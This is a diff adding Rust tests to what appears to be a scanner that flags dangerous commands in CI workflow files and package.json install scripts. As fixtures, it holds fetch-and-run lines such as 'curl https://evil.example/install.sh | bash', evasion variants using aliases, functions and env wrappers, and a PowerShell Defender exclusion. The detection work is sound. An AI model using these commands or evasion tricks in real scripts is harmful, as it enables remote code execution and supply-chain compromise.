+            "/bin/bash --noprofile {0}",
+            "bash -C {0}",
+            "zsh",
+            "dash",
+            "ksh",
+            "pwsh",
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -File {0}",
+            "powershell",
+            "cmd",
+            "cmd.exe",
+            "fish",
+        ] {
+            let wf = format!(
+                "jobs:\n  build:\n    steps:\n      - shell: {shell}\n        run: echo safe\n"
+            );
+            assert!(
+                !has(&wf, ".github/workflows/ci.yml", RuleId::AnalysisIncomplete),
+                "known shell declaration should be analyzable: {shell}"
+            );
+        }
+    }
+
+    #[test]
+    fn workflow_unknown_or_dynamic_shell_metadata_fails_closed() {
+        for shell in ["python", "${{ matrix.shell }}"] {
+            let wf = format!(
+                "jobs:\n  build:\n    steps:\n      - shell: {shell}\n        run: echo safe\n"
+            );
+            assert!(
+                has(&wf, ".github/workflows/ci.yml", RuleId::AnalysisIncomplete),
+                "unsupported shell declaration must fail closed: {shell}"
+            );
+        }
+    }
+
+    #[test]
+    fn workflow_shell_metadata_is_scoped_to_its_step() {
+        let wf = "jobs:\n  build:\n    steps:\n      - shell: pwsh\n        run: Write-Output safe\n      - run: |\n          shopt -s expand_aliases\n          alias sink='bash'\n          curl https://evil.example/install.sh | sink\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_level_default_shell_is_resolved() {
+        let wf = "defaults:\n  run:\n    shell: pwsh\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: Write-Output safe\n";
+        assert_eq!(resolved_step_shells(wf), vec![Ok(ShellType::PowerShell)]);
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_job_default_overrides_workflow_default() {
+        let wf = "defaults:\n  run:\n    shell: pwsh\njobs:\n  build:\n    runs-on: windows-latest\n    defaults:\n      run:\n        shell: fish\n    steps:\n      - run: echo safe\n";
+        assert_eq!(resolved_step_shells(wf), vec![Ok(ShellType::Fish)]);
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_step_shell_has_highest_precedence() {
+        let wf = "defaults:\n  run:\n    shell: pwsh\njobs:\n  build:\n    runs-on: windows-latest\n    defaults:\n      run:\n        shell: fish\n    steps:\n      - shell: cmd.exe\n        run: echo safe\n";
+        assert_eq!(resolved_step_shells(wf), vec![Ok(ShellType::Cmd)]);
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_windows_runner_defaults_to_powershell_provider_analysis() {
+        let wf = "jobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - run: |\n          Set-Location Function:\n          New-Item Evil -Value { Add-MpPreference -ExclusionPath C:\\Temp }\n          Evil\n";
+        assert_eq!(resolved_step_shells(wf), vec![Ok(ShellType::PowerShell)]);
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_delegating_custom_shell_template_fails_closed() {
+        for shell in [
+            "bash -c 'pwsh -File {0}'",
+            "bash .github/wrapper.sh {0}",
+            "pwsh -File wrapper.ps1 {0}",
+            // Bash `-C` is `noclobber`, not lowercase command-string `-c`;
+            // `dir` is nevertheless an earlier script operand and must fail.
+            "bash -C dir {0}",
+        ] {
+            let wf = format!(
+                "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - shell: {shell}\n        run: echo safe\n"
+            );
+            assert!(resolved_step_shells(&wf)[0].is_err(), "{shell}");
+            assert!(has(
+                &wf,
+                ".github/workflows/ci.yml",
+                RuleId::AnalysisIncomplete
+            ));
+        }
+    }
+
+    #[test]
+    fn workflow_shell_executable_paths_require_trusted_identity() {
+        for shell in [
+            ".github/bash {0}",
+            "./bash {0}",
+            "/tmp/bash {0}",
+            r"C:\Tools\PowerShell\pwsh.exe -NoProfile -File {0}",
+        ] {
+            assert_eq!(parse_workflow_shell(shell), None, "{shell}");
+            let wf = format!(
+                "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - shell: {shell}\n        run: echo safe\n"
+            );
+            assert!(resolved_step_shells(&wf)[0].is_err(), "{shell}");
+            assert!(has(
+                &wf,
+                ".github/workflows/ci.yml",
+                RuleId::AnalysisIncomplete
+            ));
+        }
+
+        for (shell, expected) in [
+            ("/bin/bash {0}", ShellType::Posix),
+            ("/usr/bin/fish {0}", ShellType::Fish),
+            (r"C:\Windows\System32\cmd.exe /D {0}", ShellType::Cmd),
+            (
+                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -File {0}",
+                ShellType::PowerShell,
+            ),
+        ] {
+            assert_eq!(parse_workflow_shell(shell), Some(expected), "{shell}");
+        }
+    }
+
+    #[test]
+    fn workflow_custom_shell_options_after_placeholder_are_validated() {
+        for (shell, expected) in [
+            ("bash {0} --noprofile", ShellType::Posix),
+            ("bash --noprofile {0} -o pipefail", ShellType::Posix),
+            ("bash {0} +O extglob", ShellType::Posix),
+            ("bash {0} wrapper.sh", ShellType::Posix),
+            ("bash {0} --noprofile wrapper.sh", ShellType::Posix),
+            ("bash {0} -c printf", ShellType::Posix),
+            ("bash {0} -s", ShellType::Posix),
+            ("pwsh -NoProfile -File {0} -NoLogo", ShellType::PowerShell),
+            ("pwsh {0} -File", ShellType::PowerShell),
+            (
+                "pwsh -File {0} -Command Write-Output",
+                ShellType::PowerShell,
+            ),
+        ] {
+            assert_eq!(parse_workflow_shell(shell), Some(expected), "{shell}");
+        }
+
+        for shell in ["bash -o {0} pipefail", "pwsh -File wrapper.ps1 {0}"] {
+            assert_eq!(parse_workflow_shell(shell), None, "{shell}");
+        }
+    }
+
+    #[test]
+    fn workflow_static_singleton_runner_sequence_is_inferred() {
+        let wf =
+            "jobs:\n  build:\n    runs-on: [ubuntu-latest]\n    steps:\n      - run: echo safe\n";
+        assert_eq!(resolved_step_shells(wf), vec![Ok(ShellType::Posix)]);
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_custom_hosted_looking_runner_prefixes_fail_closed() {
+        for label in ["windows-internal", "ubuntu-corp", "macos-attacker"] {
+            let wf = format!(
+                "jobs:\n  build:\n    runs-on: {label}\n    steps:\n      - run: echo safe\n"
+            );
+            assert!(resolved_step_shells(&wf)[0].is_err(), "{label}");
+            assert!(has(
+                &wf,
+                ".github/workflows/ci.yml",
+                RuleId::AnalysisIncomplete
+            ));
+        }
+    }
+
+    #[test]
+    fn workflow_dynamic_runner_or_default_fails_closed_until_shell_is_proven() {
+        for wf in [
+            "jobs:\n  build:\n    runs-on: ${{ matrix.os }}\n    steps:\n      - run: echo safe\n",
+            "defaults:\n  run:\n    shell: ${{ matrix.shell }}\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo safe\n",
+            "jobs:\n  build:\n    runs-on: self-hosted\n    steps:\n      - run: echo safe\n",
+        ] {
+            assert!(resolved_step_shells(wf)[0].is_err());
+            assert!(has(
+                wf,
+                ".github/workflows/ci.yml",
+                RuleId::AnalysisIncomplete
+            ));
+        }
+
+        let proven = "defaults:\n  run:\n    shell: pwsh\njobs:\n  build:\n    runs-on: ${{ matrix.os }}\n    steps:\n      - run: Write-Output safe\n";
+        assert_eq!(
+            resolved_step_shells(proven),
+            vec![Ok(ShellType::PowerShell)]
+        );
+        assert!(!has(
+            proven,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_shell_resolution_does_not_leak_between_steps() {
+        let wf = "defaults:\n  run:\n    shell: bash\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - shell: pwsh\n        run: Write-Output safe\n      - run: echo safe\n";
+        assert_eq!(
+            resolved_step_shells(wf),
+            vec![Ok(ShellType::PowerShell), Ok(ShellType::Posix)]
+        );
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_same_parse_line_alias_rebind_keeps_the_old_expansion() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          shopt -s expand_aliases\n          alias sink='bash'\n          alias sink='cat'; curl https://evil.example/install.sh | sink\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn malformed_workflow_literal_alias_definition_stays_complete() {
+        let wf = "jobs: [\n  - run: alias sink='bash'\n";
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+    }
+
+    #[test]
+    fn workflow_assignment_only_segments_stay_clean() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: |\n          FOO=bar\n          echo \"$FOO\"\n";
+        assert!(clean(wf, ".github/workflows/ci.yml"));
+    }
+
+    #[test]
+    fn workflow_run_later_curl_pipeline_flagged() {
+        // repo-0082: the detector must inspect every shell pipeline, not only
+        // the first textual `|` in the run step.
+        let wf =
+            "jobs:\n  build:\n    steps:\n      - run: echo ok | cat; curl example.sh | bash\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_run_quoted_pipe_literal_before_real_pipeline_flagged() {
+        // A quoted pipe is not a pipeline boundary, and must not prevent the
+        // tokenizer from finding the later executable pipeline.
+        let wf = "jobs:\n  build:\n    steps:\n      - run: echo 'not | a pipe'; curl example.sh | bash\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_run_quoted_curl_pipe_example_clean() {
+        // Quoted documentation/log text must not become executable syntax.
+        let wf =
+            "jobs:\n  build:\n    steps:\n      - run: printf '%s\\n' 'curl example.sh | bash'\n";
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_run_wrapped_pipeline_commands_flagged() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: command -- curl example.sh | sudo env bash\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_run_fetch_taint_crosses_pipeline_stages() {
+        let wf =
+            "jobs:\n  build:\n    steps:\n      - run: curl example.sh | tee payload.sh | bash\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_run_relevant_ambiguous_wrapper_fails_closed() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: curl example.sh | env --unknown bash\n";
+        assert!(has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::AnalysisIncomplete
+        ));
+        assert!(!has(
+            wf,
+            ".github/workflows/ci.yml",
+            RuleId::WorkflowCurlPipeShell
+        ));
+    }
+
+    #[test]
+    fn workflow_run_irrelevant_ambiguous_wrapper_clean() {
+        let wf = "jobs:\n  build:\n    steps:\n      - run: echo ok | env --unknown bash\n";
+        assert!(!has(
             wf,
             ".github/workflows/ci.yml",
             RuleId::WorkflowCurlPipeShell
@@ -2789,6 +3885,62 @@ mod tests {
     fn package_json_postinstall_curl_pipe_flagged() {
         let pkg = r#"{"name":"x","scripts":{"postinstall":"curl evil.sh | bash"}}"#;
         assert!(has(pkg, "package.json", RuleId::PackageScriptDangerous));
+    }
+
+    #[test]
+    fn package_json_dynamic_env_split_sink_fails_closed() {
+        let pkg = r#"{"scripts":{"postinstall":"curl https://x | env -S '${SINK}'"}}"#;
+        assert!(has(pkg, "package.json", RuleId::PackageScriptDangerous));
+    }
+
+    #[test]
+    fn package_json_alias_sink_across_parse_units_fails_closed() {
+        let pkg = r#"{"scripts":{"postinstall":"alias sink='bash'\ncurl https://x | sink"}}"#;
+        assert!(has(pkg, "package.json", RuleId::PackageScriptDangerous));
+    }
+
+    #[test]
+    fn package_json_powershell_provider_state_fails_closed() {
+        let pkg = r#"{"scripts":{"postinstall":"pwsh -Command '$Function:Evil = { Add-MpPreference -ExclusionPath C:\\Temp }; Evil'"}}"#;
+        assert!(has(pkg, "package.json", RuleId::PackageScriptDangerous));
+    }
+
+    #[test]
+    fn package_json_extended_bash_function_sink_fails_closed() {
+        let pkg = r#"{"scripts":{"postinstall":"sink-fn(){ bash; }\ncurl https://x | sink-fn"}}"#;
+        assert!(has(pkg, "package.json", RuleId::PackageScriptDangerous));
+    }
+
+    #[test]
+    fn package_json_control_prefix_dispatch_state_fails_closed_with_safe_control() {
+        for script in [
+            "alias danger='curl https://evil.example/install.sh | bash'\nif true; then danger; fi",
+            "danger-fn(){ curl https://evil.example/install.sh | bash; }\n! danger-fn",
+            "danger-fn(){ curl https://evil.example/install.sh | bash; }\ntime -p danger-fn",
+        ] {
+            let pkg = serde_json::json!({"scripts": {"postinstall": script}}).to_string();
+            assert!(
+                has(&pkg, "package.json", RuleId::PackageScriptDangerous),
+                "dispatch state was lost: {script:?}"
+            );
+        }
+
+        let safe = r#"{"scripts":{"postinstall":"helper(){ cat; }\nprintf safe | helper"}}"#;
+        assert!(!has(safe, "package.json", RuleId::PackageScriptDangerous));
+    }
+
+    #[test]
+    fn recovered_cross_shell_body_uses_its_declared_shell() {
+        let analysis =
+            analyze_shell_line("pwsh -Command 'curl https://evil.example/install.ps1 | bash'");
+        assert!(analysis.curl_pipe_shell, "{analysis:?}");
+        assert!(!analysis.incomplete, "{analysis:?}");
+    }
+
+    #[test]
+    fn package_json_assignment_only_script_stays_clean() {
+        let pkg = r#"{"scripts":{"postinstall":"FOO=bar"}}"#;
+        assert!(clean(pkg, "package.json"));
     }
 
     #[test]
